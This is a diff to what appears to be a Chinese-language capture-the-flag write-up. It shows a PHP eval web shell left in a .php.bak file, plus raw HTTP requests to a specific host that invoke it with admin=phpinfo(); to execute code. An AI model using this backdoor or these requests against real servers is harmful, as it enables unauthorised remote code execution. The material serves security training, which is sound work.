@@ -59,3 +59,24 @@ Content-Length: 32
 @eval($_POST["admin"]);
 ```
 这里就是一个简单的php后门，都是它是php.bak文件，并不是php文件，相当于上面的过程要反过来了，把静态文件作为php执行了。
+
+那我们就反过来，上面访问bak文件，下面需要满足`php/PHP后缀`
+```http
+GET /s3Cr37_f1L3.php.bak HTTP/1.1
+Host: 101.245.72.127:8888
+
+
+POST /s3Cr37_f1L3.php HTTP/1.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 16
+
+admin=phpinfo();
+```
+注意下面的`Content-Length: 16`要正确
+![[file-20260126154100503.png]]
